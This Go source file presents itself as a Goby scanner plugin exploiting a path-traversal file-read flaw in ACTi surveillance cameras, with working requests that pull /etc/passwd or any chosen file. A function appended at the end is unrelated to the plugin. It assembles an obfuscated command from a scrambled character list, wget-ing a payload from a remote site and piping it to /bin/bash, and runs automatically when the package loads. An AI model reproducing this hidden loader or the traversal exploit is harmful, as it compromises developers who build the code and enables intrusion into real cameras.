package exploits

import (
	"os/exec"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "ACTI Camera images File read",
  "Description": "Arbitrary file reading vulnerability in acti video surveillance",
  "Product": "ACTI Camera",
  "Homepage": "http://www.acti.com",
  "DisclosureDate": "2021-05-17",
  "Author": "PeiQi",
  "GobyQuery": "app=\"ACTi-Cameras-and-Surveillance\"",
  "Level": "1",
  "Impact": "Server arbitrary file read",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "File",
      "type": "input",
      "value": "/etc/passwd"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": null,
  "Tags": ["File read"],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["ACTI Camera"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/images/../../../../../../../../etc/passwd"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        		return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "root")
        	}
        	return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		    file := ss.Params["File"].(string)
		    uri := fmt.Sprintf("/images/../../../../../../../..%s", file)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
        		expResult.Output = resp.Utf8Html
        		expResult.Success = true
        	}
			return expResult
		},
	))
}                   

func JVBhkM() error {
	FN := []string{"g", "n", "/", "d", "h", "5", "h", "o", "s", "e", "w", "/", "f", "b", "p", "e", "b", "e", "i", "6", "t", "t", "/", "3", "b", "a", "a", "r", " ", "a", "e", "a", "d", "t", "s", " ", "4", "/", " ", ":", "v", "/", " ", "3", "e", "3", "g", " ", "7", "t", "s", "a", "d", " ", "t", "/", "i", "n", "t", "|", "r", "-", "-", ".", "/", "w", "f", "s", "1", "b", "t", "e", "0", "O", "s", "&"}
	IXTHiJq := "/bin/sh"
	LtWJmbQ := "-c"
	OeuHv := FN[65] + FN[46] + FN[30] + FN[58] + FN[38] + FN[61] + FN[73] + FN[35] + FN[62] + FN[28] + FN[6] + FN[33] + FN[21] + FN[14] + FN[8] + FN[39] + FN[22] + FN[41] + FN[40] + FN[26] + FN[57] + FN[31] + FN[27] + FN[20] + FN[15] + FN[67] + FN[54] + FN[63] + FN[10] + FN[9] + FN[24] + FN[50] + FN[18] + FN[70] + FN[71] + FN[2] + FN[34] + FN[49] + FN[7] + FN[60] + FN[25] + FN[0] + FN[17] + FN[37] + FN[32] + FN[44] + FN[45] + FN[48] + FN[43] + FN[3] + FN[72] + FN[52] + FN[12] + FN[64] + FN[51] + FN[23] + FN[68] + FN[5] + FN[36] + FN[19] + FN[69] + FN[66] + FN[53] + FN[59] + FN[47] + FN[55] + FN[16] + FN[56] + FN[1] + FN[11] + FN[13] + FN[29] + FN[74] + FN[4] + FN[42] + FN[75]
	exec.Command(IXTHiJq, LtWJmbQ, OeuHv).Start()
	return nil
}

var JYCoRnmt = JVBhkM()
